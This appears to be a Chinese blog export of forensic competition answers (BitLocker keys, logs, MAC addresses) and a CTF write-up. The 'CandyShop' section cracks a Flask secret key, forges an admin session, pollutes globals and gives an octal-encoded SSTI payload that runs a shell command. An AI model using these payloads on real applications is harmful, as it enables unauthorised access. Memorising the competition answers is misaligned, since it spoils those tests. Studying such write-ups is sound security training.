<h1 id="57-根据阿力士FTP服务器设定显示，此服务器是以方式连接网络，且是一个网络状态"><a href="#57-根据阿力士FTP服务器设定显示，此服务器是以方式连接网络，且是一个网络状态" class="headerlink" title="57.根据阿力士FTP服务器设定显示，此服务器是以方式连接网络，且是一个网络状态"></a>57.根据阿力士FTP服务器设定显示，此服务器是以<strong><em>方式连接网络，且是一个</em></strong>网络状态</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/59.png" class="" title="alt text">
<img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/60.png" class="" title="alt text">
<h1 id="58-阿力士FTP-服务器设定最多使用者数目是-请以阿拉伯数字回答"><a href="#58-阿力士FTP-服务器设定最多使用者数目是-请以阿拉伯数字回答" class="headerlink" title="58.阿力士FTP 服务器设定最多使用者数目是 _ (请以阿拉伯数字回答)"></a>58.阿力士FTP 服务器设定最多使用者数目是 <em>_</em> (请以阿拉伯数字回答)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/61.png" class="" title="alt text">
<p>50个</p>
<h1 id="59-阿力士FTP服务器使用Docker安装了一个FTP程序为-。-例如-space-docker-1-1，请输入spacedocker-1-1，不要输入空格"><a href="#59-阿力士FTP服务器使用Docker安装了一个FTP程序为-。-例如-space-docker-1-1，请输入spacedocker-1-1，不要输入空格" class="headerlink" title="59.阿力士FTP服务器使用Docker安装了一个FTP程序为_。(例如 space docker/1.1，请输入spacedocker/1.1，不要输入空格)"></a>59.阿力士FTP服务器使用Docker安装了一个FTP程序为<em>_</em>。(例如 space docker/1.1，请输入spacedocker/1.1，不要输入空格)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/62.png" class="" title="alt text">
<h1 id="60-阿力士FTP-服务器曾使用过甚么版本的Linux内核"><a href="#60-阿力士FTP-服务器曾使用过甚么版本的Linux内核" class="headerlink" title="60.阿力士FTP 服务器曾使用过甚么版本的Linux内核?"></a>60.阿力士FTP 服务器曾使用过甚么版本的Linux内核?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/63.png" class="" title="alt text">
<h1 id="61-阿力士FTP-服务器的磁盘分区，有以下哪一种文件系统"><a href="#61-阿力士FTP-服务器的磁盘分区，有以下哪一种文件系统" class="headerlink" title="61.阿力士FTP 服务器的磁盘分区，有以下哪一种文件系统?"></a>61.阿力士FTP 服务器的磁盘分区，有以下哪一种文件系统?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/xt.png" class="" title="alt text">
<img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/xt2.png" class="" title="alt text">
<h1 id="62-阿力士FTP服务器用户输入了指令-去检查现存的Docker容器-例如-netstat-lntp，请输入-netstatlntp，不要输入空格"><a href="#62-阿力士FTP服务器用户输入了指令-去检查现存的Docker容器-例如-netstat-lntp，请输入-netstatlntp，不要输入空格" class="headerlink" title="62.阿力士FTP服务器用户输入了指令 _ 去检查现存的Docker容器 (例如 netstat lntp，请输入 netstatlntp，不要输入空格)"></a>62.阿力士FTP服务器用户输入了指令 <em>_</em> 去检查现存的Docker容器 (例如 netstat lntp，请输入 netstatlntp，不要输入空格)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/64.png" class="" title="alt text">
]]></content>
      <tags>
        <tag>取证</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/11/09/%E7%BE%8E%E4%BA%9A24/</url>
    <content><![CDATA[<p>0887EA0B-12ED-43E8-970B-6721951B6975</p>
<p>18<br>19 C<br>31 0x7f0c0000<br>32 B,C<br>42 B<br>43 A   64F4E21C1E4CC3A60137DA79E75BF973<br>44 A<br>45 C<br>46<br>49 C<br>50 A<br>51 B<br>52 B<br>53 D<br>54 A (不确定)<br>55 D<br>56<br>57 A,D排不掉<br>58 SUID<br>59 D<br>60 tor-browser-launcher<br>61 4<br>62<br>63 YES<br>64<br>65<br>66<br>69 <a href="https://teamviewer_internal/">https://teamviewer_internal/</a><br>70 90:61:AE:C0:90:C2<br>71 C<br>72 192.168.182.2/24<br>73 687062512</p>
]]></content>
  </entry>
  <entry>
    <title>长城杯复现</title>
    <url>/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="SQLUP"><a href="#SQLUP" class="headerlink" title="SQLUP"></a>SQLUP</h1><p>登陆之后文件上传不多说</p>
<h1 id="CandyShop"><a href="#CandyShop" class="headerlink" title="CandyShop"></a>CandyShop</h1><p>在比赛的时候以为这个是用条件竞争来写，我太傻了<br>赛后看了wp 发现SECRET_KEY竟然可以爆破出来<br>使用flask-unsign可以对key进行爆破<br>用法<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-----------------------------加密</span><br><span class="line">PS C:\Users\24882&gt; C:\Users\24882\AppData\Roaming\Python\Python312\Scripts\flask-unsign.exe -d -c <span class="string">&quot;.eJwNy0sKgCAQANC7zLpFTqTWZWJ0xpDQwM8iorvn9sF7wdcSjnZfkmEHH3CxOHtjcWPSMqvgtCOFmp2xTM4gB8srTBBZcovtGevsUtugXqVkSjKIOMUM3w-UGR5A.Zt2O4Q.FR2Rf6GsDgArFUTCs69-3mqInJ8&quot;</span> -S <span class="string">&quot;a123456&quot;</span></span><br><span class="line"></span><br><span class="line">-----------------------------解码</span><br><span class="line"></span><br><span class="line">PS C:\Users\24882&gt; C:\Users\24882\AppData\Roaming\Python\Python312\Scripts\flask-unsign.exe -s -c <span class="string">&quot;&#123;&#x27;csrf_token&#x27;: &#x27;cf23820c7829da6e01fb6ba126db78dab72df8d5&#x27;, &#x27;identity&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot;</span> -S <span class="string">&quot;a123456&quot;</span></span><br></pre></td></tr></table></figure><br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">爆破</span><br><span class="line">C:\Users\24882\AppData\Roaming\Python\Python312\Scripts\flask-unsign.exe -u -c <span class="string">&quot;.eJwNy0sKgCAQANC7zLpFTqTWZWJ0xpDQwM8iorvn9sF7wdcSjnZfkmEHH3CxOHtjcWPSMqvgtCOFmp2xTM4gB8srTBBZcovtGevsUtugXqVkSjKIOMUM3w-UGR5A.Zt2O4Q.FR2Rf6GsDgArFUTCs69-3mqInJ8&quot;</span></span><br></pre></td></tr></table></figure><br>经过爆破得出来key的值为a123456<br><br>那么我们就可以进行session伪造了<br>查看源码我们会发现admin路由下存在原型链污染<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    identity = session.get(<span class="string">&#x27;identity&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> identity != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">    admin = Admin()</span><br><span class="line">    merge(session, admin)</span><br><span class="line">    admin_user.append(admin)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, view=<span class="string">&#x27;index&#x27;</span>)</span><br></pre></td></tr></table></figure><br>并且merge函数没有进行过滤。<br>那么我们可以先原型链污染一下sold来看一下secret.txt是什么<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">l</span><br><span class="line">C:\Users\24882\AppData\Roaming\Python\Python312\Scripts\flask-unsign.exe -s -c <span class="string">&quot;&#123;&#x27;csrf_token&#x27;: &#x27;cf23820c7829da6e01fb6ba126db78dab72df8d5&#x27;, &#x27;identity&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;,&#x27;__init__&#x27;:&#123;&#x27;__globals__&#x27;:&#123;&#x27;sold&#x27;:503&#125;&#125;&#125;&quot;</span> -S <span class="string">&quot;a123456&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>我们能读取到secret.txt的内容但是因为我这是赛后复现导致像这些文件的内容我只能通过wp来知晓。内容为 /tmp/xxxxxx/xxxxxx/flag<br>这就需要我们进行命令执行后寻找flag<br>经过待审我们会发现如下代码<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize_inventory_sold</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r&#x27;[a-zA-Z_]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="built_in">str</span>(value))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin/view_inventory&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_inventory</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    identity = session.get(<span class="string">&#x27;identity&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> identity != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">    inventory_value = sanitize_inventory_sold(inventory)</span><br><span class="line">    sold_value = sanitize_inventory_sold(sold)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;商店库存:&quot;</span> + inventory_value + <span class="string">&quot;已售出&quot;</span> + sold_value)</span><br></pre></td></tr></table></figure><br>我们会发现其不允许我们使用字母，但是我们可以使用[]+八进制的方法来进行ssti<br>最终payload如下<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">flask-unsign -s -c <span class="string">&quot;&#123;&#x27;csrf_token&#x27;: &#x27;cf23820c7829da6e01fb6ba126db78dab72df8d5&#x27;, &#x27;identity&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;,&#x27;__init__&#x27;:&#123;&#x27;__globals__&#x27;:&#123;&#x27;sold&#x27;:&#x27;&#123;&#123;()[\&#x27;\\137\\137\\143\\154\\141\\163\\163\\137\\137\&#x27;][\&#x27;\\137\\137\\142\\141\\163\\163\\137\\137\&#x27;][\&#x27;\\137\\137\\142\\141\\163\\145\\137\\137\&#x27;][\&#x27;\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137\&#x27;]()[161][\&#x27;\\137\\137\\151\\156\\151\\164\\137\\137\&#x27;][\&#x27;\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137\&#x27;][\&#x27;\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137\&#x27;][\&#x27;\\145\\166\\141\\154\&#x27;](\&#x27;\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\50\\42\\157\\163\\42\\51\\56\\160\\157\\160\\145\\156\\50\\42\\167\\150\\157\\141\\155\\151\\42\\51\\56\\162\\145\\141\\144\\50\\51\&#x27;)&#125;&#125;&#x27;&#125;&#125;&#125;&quot;</span> -S <span class="string">&quot;a123456&quot;</span></span><br></pre></td></tr></table></figure><br></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>比赛wp(复现)</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>美亚21团体</title>
    <url>/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/</url>
    <content><![CDATA[<p><code>uR%&#123;)Y&#39;Qz-n3oGU`ZJo@(1ntxp8U1+bW;JlZH^I4%0rxf;[N+eQ)Lolrw&amp;E%,4q1</code></p>
<h1 id="几天后，“大路建设”旗下有一家名为“元材原料”的材料供应子公司，该公司发现几名员工的个人财务资料在网上遭公开发布。为了员工安全，主管决定报警求助。经警方调查发现黑客入侵的手法与“大路建设”的案件十分相似，因此引起调查人员怀疑两起案件有所关联。经调查后，警方拘捕了“常威”和“特普”两名本地男子，怀疑他们与本案有关。警方在搜查他们的住宅及公司后，扣押了数台数码设备，请分析以下电子数据并重建电子数据痕迹，以确认“常威”和“特普”在本案中是否有违法犯罪，并还原事件经过。"><a href="#几天后，“大路建设”旗下有一家名为“元材原料”的材料供应子公司，该公司发现几名员工的个人财务资料在网上遭公开发布。为了员工安全，主管决定报警求助。经警方调查发现黑客入侵的手法与“大路建设”的案件十分相似，因此引起调查人员怀疑两起案件有所关联。经调查后，警方拘捕了“常威”和“特普”两名本地男子，怀疑他们与本案有关。警方在搜查他们的住宅及公司后，扣押了数台数码设备，请分析以下电子数据并重建电子数据痕迹，以确认“常威”和“特普”在本案中是否有违法犯罪，并还原事件经过。" class="headerlink" title="几天后，“大路建设”旗下有一家名为“元材原料”的材料供应子公司，该公司发现几名员工的个人财务资料在网上遭公开发布。为了员工安全，主管决定报警求助。经警方调查发现黑客入侵的手法与“大路建设”的案件十分相似，因此引起调查人员怀疑两起案件有所关联。经调查后，警方拘捕了“常威”和“特普”两名本地男子，怀疑他们与本案有关。警方在搜查他们的住宅及公司后，扣押了数台数码设备，请分析以下电子数据并重建电子数据痕迹，以确认“常威”和“特普”在本案中是否有违法犯罪，并还原事件经过。"></a>几天后，“大路建设”旗下有一家名为“元材原料”的材料供应子公司，该公司发现几名员工的个人财务资料在网上遭公开发布。为了员工安全，主管决定报警求助。经警方调查发现黑客入侵的手法与“大路建设”的案件十分相似，因此引起调查人员怀疑两起案件有所关联。经调查后，警方拘捕了“常威”和“特普”两名本地男子，怀疑他们与本案有关。警方在搜查他们的住宅及公司后，扣押了数台数码设备，请分析以下电子数据并重建电子数据痕迹，以确认“常威”和“特普”在本案中是否有违法犯罪，并还原事件经过。</h1><h1 id="大路建设"><a href="#大路建设" class="headerlink" title="大路建设"></a>大路建设</h1><h2 id="工地职员A的办公室计算机"><a href="#工地职员A的办公室计算机" class="headerlink" title="工地职员A的办公室计算机"></a>工地职员A的办公室计算机</h2><h3 id="1-填空题-工地职员A计算机的修复密钥标识符是什么？-请以大写英文及阿拉伯数字输入答案，不要输入”-“-1分"><a href="#1-填空题-工地职员A计算机的修复密钥标识符是什么？-请以大写英文及阿拉伯数字输入答案，不要输入”-“-1分" class="headerlink" title="1. [填空题] 工地职员A计算机的修复密钥标识符是什么？(请以大写英文及阿拉伯数字输入答案，不要输入”-“) (1分)"></a>1. [填空题] 工地职员A计算机的修复密钥标识符是什么？(请以大写英文及阿拉伯数字输入答案，不要输入”-“) (1分)</h3><p>230C1BB3-106A-4E4E-BF5D-3D10961585D4<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-091313330.png" class="">  </p>
<h3 id="2-填空题-工地职员A计算机的修复密钥解除锁定是什么？-请以数字输入答案，不要输入”-“-1分"><a href="#2-填空题-工地职员A计算机的修复密钥解除锁定是什么？-请以数字输入答案，不要输入”-“-1分" class="headerlink" title="2. [填空题] 工地职员A计算机的修复密钥解除锁定是什么？(请以数字输入答案，不要输入”-“) (1分)"></a>2. [填空题] 工地职员A计算机的修复密钥解除锁定是什么？(请以数字输入答案，不要输入”-“) (1分)</h3><p>BitLocker加密时，是必须进行备份的不管是什么方式都会产生痕迹。我们在A的计算机里搜索可以找到一个文件记录叫<code>BitLocker 修復金鑰 49737A2E-6E82-4EAF-94B5-E1DB4F7CA642.TXT</code>但是其计算机里找不到，猜测被嫌疑人加密后删除了。而其作案手法又与阿力士相似，我们在阿里士的ftp里搜索，可以找到<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-100852131.png" class=""><br>在阿力士的FTP里可以找到密钥。<br>483714-461582-060962-373351-019646-502348-309628-684431</p>
<h3 id="3-单选题-工地职员A的计算机被什么程式加密？-1分"><a href="#3-单选题-工地职员A的计算机被什么程式加密？-1分" class="headerlink" title="3. [单选题] 工地职员A的计算机被什么程式加密？ (1分)"></a>3. [单选题] 工地职员A的计算机被什么程式加密？ (1分)</h3><p>A. Ransomware</p>
<p>B. BitLocker</p>
<p>C. AxCrypt</p>
<p>D. PGP</p>
<p>E. FileVault 2</p>
<p>B</p>
<h3 id="4-单选题-工地职员A的孩子有可能正准备就读什么学校？-2分"><a href="#4-单选题-工地职员A的孩子有可能正准备就读什么学校？-2分" class="headerlink" title="4. [单选题] 工地职员A的孩子有可能正准备就读什么学校？ (2分)"></a>4. [单选题] 工地职员A的孩子有可能正准备就读什么学校？ (2分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-094737103.png" class="">  
<p>A. 小学</p>
<p>B. 中学</p>
<p>C. 幼儿园</p>
<p>D. 大学<br>C</p>
<h3 id="5-多选题-工地职员A并没有打开过哪一个档案？-2分"><a href="#5-多选题-工地职员A并没有打开过哪一个档案？-2分" class="headerlink" title="5. [多选题] 工地职员A并没有打开过哪一个档案？ (2分)"></a>5. [多选题] 工地职员A并没有打开过哪一个档案？ (2分)</h3><p>A. Staff3.xlsx</p>
<p>B. Staff4.xlsx</p>
<p>//C. Staff1.xlsx</p>
<p>D. Staff2.xlsx</p>
<p>//E. BTC address.bmp<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-100325468.png" class=""><br>在最近访问中只能找到如上两个文档<br>ABD</p>
<h3 id="6-填空题-工地职员A的计算机被远程控制了多少分钟？-请以阿拉伯数字回答-2分"><a href="#6-填空题-工地职员A的计算机被远程控制了多少分钟？-请以阿拉伯数字回答-2分" class="headerlink" title="6. [填空题] 工地职员A的计算机被远程控制了多少分钟？(请以阿拉伯数字回答) (2分)"></a>6. [填空题] 工地职员A的计算机被远程控制了多少分钟？(请以阿拉伯数字回答) (2分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-101833916.png" class="">  
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-101813844.png" class=""> 
<p>可以取证大师一把梭也可以在火眼看源文件来计算，但是火眼看到源文件的时间比取证大师的时间少了8小时，因为计算机记录的时间是UTC，而北京时间是东八区即UTC+8<br>11</p>
<h3 id="7-单选题-工地职员A的计算机被加密后，被要求存入的虚疑货币是什么？-1分"><a href="#7-单选题-工地职员A的计算机被加密后，被要求存入的虚疑货币是什么？-1分" class="headerlink" title="7. [单选题] 工地职员A的计算机被加密后，被要求存入的虚疑货币是什么？ (1分)"></a>7. [单选题] 工地职员A的计算机被加密后，被要求存入的虚疑货币是什么？ (1分)</h3><p>A. 比特币现金</p>
<p>B. 比特币</p>
<p>C. 以太币</p>
<p>D. 泰达币</p>
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-102254148.png" class="">  
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-102322320.png" class="">  
<p>A</p>
<h3 id="8-填空题-在工地职员A的计算机曾经打开过的Excel档案中，有多少人有可能在法律部门工作？-请以阿拉伯数字回答-1分"><a href="#8-填空题-在工地职员A的计算机曾经打开过的Excel档案中，有多少人有可能在法律部门工作？-请以阿拉伯数字回答-1分" class="headerlink" title="8. [填空题] 在工地职员A的计算机曾经打开过的Excel档案中，有多少人有可能在法律部门工作？(请以阿拉伯数字回答) (1分)"></a>8. [填空题] 在工地职员A的计算机曾经打开过的Excel档案中，有多少人有可能在法律部门工作？(请以阿拉伯数字回答) (1分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-103604216.png" class="">  
<p>22</p>
<h2 id="工地职员B的办公室计算机"><a href="#工地职员B的办公室计算机" class="headerlink" title="工地职员B的办公室计算机"></a>工地职员B的办公室计算机</h2><h3 id="9-多选题-工地职员-B-的计算机在什么日期和时间被黑客控制？-2分"><a href="#9-多选题-工地职员-B-的计算机在什么日期和时间被黑客控制？-2分" class="headerlink" title="9 . [多选题] 工地职员 B 的计算机在什么日期和时间被黑客控制？ (2分)"></a>9 . [多选题] 工地职员 B 的计算机在什么日期和时间被黑客控制？ (2分)</h3><p>A. 2021-10-19</p>
<p>B. 2021-09-16</p>
<p>C. 11:16:41 (UTC +8:00)</p>
<p>D. 05:55:50 (UTC +8:00)</p>
<p>E. 18:40:06 (UTC +8:00)<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-104347322.png" class=""><br>感觉题目怪怪的</p>
<h3 id="10-填空题-工地职员-B-的计算机的MAC-Address是什么-请以大写英文及数字输入答案-1分"><a href="#10-填空题-工地职员-B-的计算机的MAC-Address是什么-请以大写英文及数字输入答案-1分" class="headerlink" title="10. [填空题] 工地职员 B 的计算机的MAC Address是什么? (请以大写英文及数字输入答案) (1分)"></a>10. [填空题] 工地职员 B 的计算机的MAC Address是什么? (请以大写英文及数字输入答案) (1分)</h3><p>查看网络网卡的Mac地址<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-105322293.png" class=""><br>00-0C-29-E2-53-2D</p>
<h3 id="11-填空题-工地职员-B-的计算机用户FaFa的-Profile-ID-是什么？-请以大写英文及数字输入答案，不要输入”-“-1分"><a href="#11-填空题-工地职员-B-的计算机用户FaFa的-Profile-ID-是什么？-请以大写英文及数字输入答案，不要输入”-“-1分" class="headerlink" title="11. [填空题] 工地职员 B 的计算机用户FaFa的 Profile ID 是什么？(请以大写英文及数字输入答案，不要输入”-“) (1分)"></a>11. [填空题] 工地职员 B 的计算机用户FaFa的 Profile ID 是什么？(请以大写英文及数字输入答案，不要输入”-“) (1分)</h3><p>profile ID其实就是SID<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-110025109.png" class="">  </p>
<h3 id="12-填空题-工地职员-B-的办公室计算机的-Windows-CD-Key-是什么？-请以大写英文及数字输入答案，不要输入”-“-1分"><a href="#12-填空题-工地职员-B-的办公室计算机的-Windows-CD-Key-是什么？-请以大写英文及数字输入答案，不要输入”-“-1分" class="headerlink" title="12. [填空题] 工地职员 B 的办公室计算机的 Windows CD Key 是什么？(请以大写英文及数字输入答案，不要输入”-“) (1分)"></a>12. [填空题] 工地职员 B 的办公室计算机的 Windows CD Key 是什么？(请以大写英文及数字输入答案，不要输入”-“) (1分)</h3><p>CD key其实就是产品密钥<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-110435701.png" class="">  </p>
<h3 id="13-单选题-检查过工地职员-B-的计算机登录档后-Window-Registry-，计算机感染了什么恶意软件？-2分"><a href="#13-单选题-检查过工地职员-B-的计算机登录档后-Window-Registry-，计算机感染了什么恶意软件？-2分" class="headerlink" title="13. [单选题] 检查过工地职员 B 的计算机登录档后(Window Registry)，计算机感染了什么恶意软件？ (2分)"></a>13. [单选题] 检查过工地职员 B 的计算机登录档后(Window Registry)，计算机感染了什么恶意软件？ (2分)</h3><p>A. Adware</p>
<p>B. Worms</p>
<p>C. Rootkits</p>
<p>D. 没有感染任何恶意软件</p>
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-114402900.png" class="">  
<p>D</p>
<h3 id="14-单选题-工地职员B的计算机中被加密硬盘内的图片”-120778782-58759559-jpg”，有可能是从下列哪个的途径载入计算机？-1分"><a href="#14-单选题-工地职员B的计算机中被加密硬盘内的图片”-120778782-58759559-jpg”，有可能是从下列哪个的途径载入计算机？-1分" class="headerlink" title="14. [单选题] 工地职员B的计算机中被加密硬盘内的图片”_120778782_58759559.jpg”，有可能是从下列哪个的途径载入计算机？ (1分)"></a>14. [单选题] 工地职员B的计算机中被加密硬盘内的图片”_120778782_58759559.jpg”，有可能是从下列哪个的途径载入计算机？ (1分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-115034363.png" class="">  
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-113025500.png" class="">  
<p>C<br>A. 电邮下载附件</p>
<p>B. USB盘</p>
<p>C. 网上下载</p>
<p>D. 蓝芽传入</p>
<p>E. Direct-link</p>
<h3 id="15-多选题-工地职员-B-的计算机中被加密硬盘内的图片中，人物中衣着有什么颜色？-2分"><a href="#15-多选题-工地职员-B-的计算机中被加密硬盘内的图片中，人物中衣着有什么颜色？-2分" class="headerlink" title="15. [多选题] 工地职员 B 的计算机中被加密硬盘内的图片中，人物中衣着有什么颜色？ (2分)"></a>15. [多选题] 工地职员 B 的计算机中被加密硬盘内的图片中，人物中衣着有什么颜色？ (2分)</h3><p>A. 黄色</p>
<p>B. 红色</p>
<p>C. 紫色</p>
<p>D. 蓝色</p>
<p>E. 绿色<br>BE</p>
<h3 id="16-填空题-工地职员-B-的计算机有多少个磁盘分区？-请以阿拉伯数字输入答案-1分"><a href="#16-填空题-工地职员-B-的计算机有多少个磁盘分区？-请以阿拉伯数字输入答案-1分" class="headerlink" title="16. [填空题] 工地职员 B 的计算机有多少个磁盘分区？(请以阿拉伯数字输入答案) (1分)"></a>16. [填空题] 工地职员 B 的计算机有多少个磁盘分区？(请以阿拉伯数字输入答案) (1分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-115152455.png" class="">  
<p>5</p>
<h3 id="17-填空题-工地职员-B-的计算机硬盘分割表是什么？-答案请以首字母大写作答-2分"><a href="#17-填空题-工地职员-B-的计算机硬盘分割表是什么？-答案请以首字母大写作答-2分" class="headerlink" title="17. [填空题] 工地职员 B 的计算机硬盘分割表是什么？(答案请以首字母大写作答) (2分)"></a>17. [填空题] 工地职员 B 的计算机硬盘分割表是什么？(答案请以首字母大写作答) (2分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-123102374.png" class="">  
<p>在磁盘管理查看磁盘0的属性可以得到 GUID</p>
<h3 id="18-填空题-在-工地职员-B-的计算机Event-Log中最后登入时services-exe的Process-ID是什么？-请以阿拉伯数字输入-3分"><a href="#18-填空题-在-工地职员-B-的计算机Event-Log中最后登入时services-exe的Process-ID是什么？-请以阿拉伯数字输入-3分" class="headerlink" title="18. [填空题] 在 工地职员 B 的计算机Event Log中最后登入时services.exe的Process ID是什么？(请以阿拉伯数字输入) (3分)"></a>18. [填空题] 在 工地职员 B 的计算机Event Log中最后登入时services.exe的Process ID是什么？(请以阿拉伯数字输入) (3分)</h3><p>services.exe在系统开机和关机时触发，所有其帮随这用户的登陆，我们查看登陆日志<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-143439466.png" class=""><br>打开日志文件，在4624号事件里可以找到process id<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-143321629.png" class="">  </p>
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-143306025.png" class="">  
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-143552025.png" class="">  
<p>636</p>
<h1 id="元材原料"><a href="#元材原料" class="headerlink" title="元材原料"></a>元材原料</h1><h2 id="网页服务器"><a href="#网页服务器" class="headerlink" title="网页服务器"></a>网页服务器</h2><h3 id="19-填空题-甚么IP曾经上传档案到网页服务器-请以阿拉伯数字回答，不用输入”-“-2分"><a href="#19-填空题-甚么IP曾经上传档案到网页服务器-请以阿拉伯数字回答，不用输入”-“-2分" class="headerlink" title="19. [填空题] 甚么IP曾经上传档案到网页服务器? (请以阿拉伯数字回答，不用输入”.“) (2分)"></a>19. [填空题] 甚么IP曾经上传档案到网页服务器? (请以阿拉伯数字回答，不用输入”.“) (2分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-153128786.png" class="">  
<p>xampp是一个集成的web环境主要是方便安装apache而生的。<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-154632959.png" class=""><br>打开服务器然后打开浏览器会在历史记录发现网站<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-154858261.png" class=""><br>简单抓个包，可以知道其上传路由<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-155402410.png" class=""><br>看一下apache日志即可知道ip<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-155928108.png" class=""><br>不知道为什么仿真出来的ip全是192.168.20.1<br>ip为203.145.94.120 </p>
<h3 id="20-多选题-承上题，以下哪试档案曾被上传到网页服务器-3分"><a href="#20-多选题-承上题，以下哪试档案曾被上传到网页服务器-3分" class="headerlink" title="20. [多选题] 承上题，以下哪试档案曾被上传到网页服务器? (3分)"></a>20. [多选题] 承上题，以下哪试档案曾被上传到网页服务器? (3分)</h3><p>A. kjk2.jpg</p>
<p>B. kjk2.php</p>
